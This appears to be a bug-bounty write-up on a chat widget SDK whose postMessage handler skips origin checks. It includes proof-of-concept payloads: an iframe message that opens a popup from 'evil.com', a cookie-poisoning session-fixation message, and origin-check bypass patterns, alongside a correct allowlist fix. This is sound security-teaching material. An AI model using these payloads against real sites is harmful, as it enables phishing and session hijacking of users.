PostMessage Without Origin Check in Chat Widget SDK

Inspired by renwa's postMessage exploitation research · Affects all sites using the widget

Vulnerability

An open-source chat widget SDK registers a global window.onmessage handler that processes any message starting with a specific prefix. There is zero origin validation. The handler dispatches to internal event handlers that can open arbitrary URLs via window.open(), set authentication cookies, and fire custom events on the host page.

The Discovery

The researcher downloaded the chat widget SDK (29KB) and immediately searched for postMessage handlers:

grep -n 'addEventListener.*message\|onmessage' sdk.js

Line 1004: window.onmessage = e => {

The handler code had no origin check at all:

window.onmessage = e => {
  // Only checks the message prefix - NOT the origin!
  if (typeof e.data != "string" ||
      e.data.indexOf("chatwoot-widget:") !== 0) return;

  const o = JSON.parse(
    e.data.replace("chatwoot-widget:", "")
  );

  // Dispatches to event handlers based on 'event' field
  typeof g.events[o.event] == "function"
    && g.events[o.event](o);
}

The researcher then enumerated all dispatchable events:

// Exploitable events found:
events = {
  popoutChatWindow: ({baseUrl, websiteToken, locale}) => {
    window.open(baseUrl + "/widget?..."); // OPEN REDIRECT!
  },
  setAuthCookie: ({data: {widgetAuthToken}}) => {
    document.cookie = "cw_conversation=" + token; // COOKIE POISONING!
  },
  loaded: ({config: {authToken}}) => {
    // Sets auth cookie + reconfigures entire widget
  },
  onEvent: ({eventIdentifier, data}) => {
    // Fires ARBITRARY custom events on the host page
  },
  toggleBubble: () => { /* UI manipulation */ },
  setBubbleLabel: ({label}) => { /* Changes button text */ }
}

Exploitation Vectors

1. Open Redirect via window.open()

The popoutChatWindow event calls window.open() with an attacker-controlled baseUrl. If the victim's page has the widget and can be framed (no X-Frame-Options), any page can trigger this:

<iframe src="https://target-with-chatwoot.com" id="target"></iframe>
<script>
document.getElementById('target').onload = function() {
  this.contentWindow.postMessage(
    'chatwoot-widget:' + JSON.stringify({
      event: "popoutChatWindow",
      baseUrl: "https://evil.com",
      websiteToken: "x",
      locale: "en"
    }),
    '*'
  );
};
// Result: victim sees a popup from evil.com
// that looks like a legitimate chat window
</script>

2. Session Fixation via Cookie Poisoning

The setAuthCookie event sets the conversation cookie to any value the attacker provides. This enables chat session fixation — the attacker can make the victim join a conversation they control:

// From attacker's page or injected script:
window.postMessage(
  'chatwoot-widget:' + JSON.stringify({
    event: "setAuthCookie",
    data: { widgetAuthToken: "attacker-controlled-token" }
  }),
  '*'
);
// Victim's chat session is now fixated to attacker's token

3. Wildcard postMessage Response (Data Leak)

The SDK also sends messages with targetOrigin: "*":

sendMessage: (e, o) => {
  g.getAppFrame().contentWindow.postMessage(
    `chatwoot-widget:${JSON.stringify({event: e, ...o})}`,
    "*"  // ANY origin can receive this!
  );
}

This means if you can frame the widget iframe, you can intercept outgoing messages that may contain conversation data.

Why It Matters

This SDK is open-source and widely deployed. Every site using it is vulnerable to open redirect (phishing via trusted domain), cookie manipulation, and event injection. The attack only requires the target page to be frameable OR for the attacker to have any script execution context on the same page (browser extension, another XSS, etc.).

Origin Bypass Techniques

Even when developers do check the origin, common patterns are bypassable:

// BYPASS 1: indexOf
if (e.origin.indexOf("target.com") !== -1) { ... }
// Attack: use origin "target.com.evil.com"

// BYPASS 2: endsWith
if (e.origin.endsWith("target.com")) { ... }
// Attack: use origin "eviltarget.com"

// BYPASS 3: startsWith
if (e.origin.startsWith("https://target")) { ... }
// Attack: use origin "https://target.evil.com"

// BYPASS 4: Regex without anchors
if (/.*\.target\.com/.test(e.origin)) { ... }
// Attack: "evil-target.com" (dot matches any char)

// BYPASS 5: null origin
if (e.origin === "null" || e.origin === expected) { ... }
// Attack: sandboxed iframe sends origin "null"

// CORRECT:
const ALLOWED = ["https://app.target.com", "https://widget.target.com"];
if (!ALLOWED.includes(e.origin)) return;

Bug Bounty Tip

When you find a postMessage listener, check three things: (1) Is there an origin check? If not, instant win. (2) If there is a check, what method is used? indexOf/endsWith/startsWith are all bypassable. (3) What does the handler do with the data? Look for innerHTML, eval, location changes, cookie setting, fetch URL construction. The sink determines the severity. A postMessage to innerHTML is HIGH. A postMessage to eval is CRITICAL. A postMessage to height/width is LOW.

PostMessage Attack Patterns

1

postMessage → innerHTML = DOM XSS (inject HTML/JS)

2

postMessage → eval/Function = Direct code execution

3

postMessage → location/href = Open redirect, javascript: XSS

4

postMessage → fetch URL = CSPT, SSRF

5

postMessage → document.cookie = Session fixation

6

postMessage → wildcard response = Data exfiltration
